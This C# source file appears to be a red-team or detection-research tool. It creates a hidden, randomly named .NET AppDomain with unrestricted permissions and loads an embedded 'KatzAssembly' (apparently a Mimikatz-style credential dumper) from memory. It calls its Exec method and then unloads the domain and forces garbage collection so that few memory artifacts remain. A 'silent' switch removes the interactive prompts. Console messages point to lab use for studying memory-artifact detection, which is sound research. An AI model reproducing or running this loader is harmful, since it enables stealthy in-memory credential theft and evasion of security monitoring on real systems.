using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Security.Policy;
using System.Threading.Tasks;

namespace NewApproach
{
    [Serializable]
    public class NewApproach : MarshalByRefObject
    {
        public static bool Enter = true;

        [System.STAThreadAttribute()]
        [System.LoaderOptimization(LoaderOptimization.MultiDomain)]
        public static void MiMi()
        {
            //Console.WriteLine("=37=");
            Console.WriteLine("My Pid {0}", Process.GetCurrentProcess().Id);            
            Console.WriteLine("[press enter to create new AppDomain]");
            
            if (Enter)
                Console.ReadLine();

            string NDomain = RandomString(16);

            string DBase = Assembly.GetExecutingAssembly().Location.Substring(0, Assembly.GetExecutingAssembly().Location.LastIndexOf("NewApproach.exe") - 1 );
            Console.WriteLine(DBase);

            Evidence adevidence = AppDomain.CurrentDomain.Evidence;

            AppDomainSetup domainSetup = new AppDomainSetup()
            {
                //ApplicationBase = AppDomain.CurrentDomain.SetupInformation.ApplicationBase,
                ApplicationBase = DBase,
                ConfigurationFile = AppDomain.CurrentDomain.SetupInformation.ConfigurationFile,
                ApplicationName = AppDomain.CurrentDomain.SetupInformation.ApplicationName,
                LoaderOptimization = LoaderOptimization.MultiDomain,
                PrivateBinPath = @"http://ts-dc1.enterprise.lab/"

            };
            PermissionSet permissionSet = new PermissionSet(PermissionState.Unrestricted);

            AppDomain ad = AppDomain.CreateDomain(NDomain, adevidence, domainSetup, permissionSet);


            Console.WriteLine("++++++++++ Parent => Child Domains LoaderOptimization ++++++++++");
            Console.WriteLine(AppDomain.CurrentDomain.SetupInformation.LoaderOptimization.ToString());
            Console.WriteLine(ad.SetupInformation.LoaderOptimization.ToString());
            Console.WriteLine("++++++++++ Parent => Child Domains ApplicationBase ++++++++++");
            Console.WriteLine(AppDomain.CurrentDomain.SetupInformation.ApplicationBase.ToString());
            Console.WriteLine(ad.SetupInformation.ApplicationBase.ToString()); 
            Console.WriteLine("++++++++++ Parent => Child Domains PrivateBinPath ++++++++++");
            Console.WriteLine(AppDomain.CurrentDomain.SetupInformation.PrivateBinPath?.ToString() ?? "");
            Console.WriteLine(ad.SetupInformation.PrivateBinPath?.ToString() ?? "");
            Console.WriteLine("+++++++++++++++++++++++++++++++++++++++++++++");

            Console.WriteLine("New AppDomain {0} just was created\nAnd everything stay clear, because now AppDomain is empty\n[press enter]", NDomain);
            if (Enter)
                Console.ReadLine();

            try
            {
                object[] parameters = { Properties.Resources.KatzAssembly };
                string LoaderAssemblyName = typeof(AssemblyLoader).Assembly.FullName;
                string LoaderClassName = typeof(AssemblyLoader).FullName;
                Console.WriteLine("loading loader {0} {1}", LoaderClassName, LoaderClassName);

                ad.AppendPrivatePath(@"http://ts-dc1.enterprise.lab/");
                
                /*object assloader =*/ ad.CreateInstanceAndUnwrap(
                    LoaderAssemblyName, 
                    LoaderClassName, 
                    true, 
                    BindingFlags.CreateInstance,
                    null, parameters, null, null);
                
            }
            catch (FileNotFoundException e)
            {
                Console.WriteLine("Error working with loader\n{0}!", e.Message, e.FileName);
                Console.ReadLine();
            }

            Console.WriteLine("Appdomain {0} finished its work (no active thread)", NDomain);
            Console.WriteLine("But still alive and store some artifacts");
            Console.WriteLine("We should do memory scan NOW, when resive module=>assembly=>appdomain unload events to collect&detect memory artifacts, before GC clear em");
            Console.WriteLine("[Press enter to clear Appdomain]\n(generate AppDomain, Assembly & Module Unload events)");
            if (Enter)
                Console.ReadLine();
            AppDomain.Unload(ad);
            ad = null;
            GC.Collect();
            GC.WaitForFullGCComplete();
            Console.ResetColor();
            Console.WriteLine("Appdomain cleared, no any artifacts, but app still running :-)",Console.ForegroundColor = ConsoleColor.Gray);
            if (Enter)
                Console.ReadLine();
        }

        private const UInt32 StdOutputHandle = 0xFFFFFFF5;
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetStdHandle(UInt32 nStdHandle);
        [DllImport("kernel32.dll")]
        private static extern void SetStdHandle(UInt32 nStdHandle, IntPtr handle);
        [DllImport("kernel32")]
        static extern bool AllocConsole();

        static void Main(string[] args)
        {
            AllocConsole();
            if (args.Length > 0)
                if (args[0].ToLower().Contains("silent"))
                    Enter = false;
            MiMi();
        }

        [System.STAThreadAttribute()]
        [System.LoaderOptimization(LoaderOptimization.MultiDomain)]
        public static void Interactive()
        {
            MiMi();
        }
        [System.STAThreadAttribute()]
        [System.LoaderOptimization(LoaderOptimization.MultiDomain)]
        public static void NonInteractive()
        {
            Enter = false;
            MiMi();
        }

        [Serializable]
        public class AssemblyLoader : MarshalByRefObject
        {

            private Assembly _assembly;
            
            [PermissionSet(SecurityAction.Assert, Unrestricted = true)]
            public AssemblyLoader()
            {
                Console.WriteLine("loader created initialisation in {0}", AppDomain.CurrentDomain.FriendlyName);
            }

            [PermissionSet(SecurityAction.Assert, Unrestricted = true)]
            public AssemblyLoader(byte[] ass)
            {
                _assembly = AppDomain.CurrentDomain.Load(ass);
                
                Console.WriteLine("{0} was loaded into {1} by loader initialisation", _assembly.FullName, AppDomain.CurrentDomain.FriendlyName );
                try
                {
                    this.ExecuteStaticMethod("KatzAssembly.Katz", "Exec");
                }
                catch (Exception e)
                {
                    Console.WriteLine("Error ExecuteStaticMethod\n{0}", e.Message);
                    Console.ReadLine();
                    try
                    {
                        object obj = this.Load("KatzAssembly.ClassInteractive");
                    }
                    catch (Exception ee)
                    {
                        Console.WriteLine("Error Load\n{0}", ee.Message);
                        Console.WriteLine("Pizdetc, oba metoda");
                        Console.ReadLine();
                        return;
                    }

                }
                Console.WriteLine("KatzAssembly was executed. Leaving loader" );
            }
            
            public object Load(string className)
            {
                object ret = null;
                try
                {
                    ret = AppDomain.CurrentDomain.CreateInstanceAndUnwrap(_assembly.FullName, className);
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                return ret;
            }

            public object ExecuteStaticMethod(string typeName, string methodName, params object[] parameters)
            {
                Type type = _assembly.GetType(typeName);
                // TODO: this won't work if there are overloads available
                MethodInfo method = type.GetMethod(
                    methodName,
                    BindingFlags.Static | BindingFlags.Public);
                return method.Invoke(null, parameters);
            }
        }

        private static Random random = new Random();

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
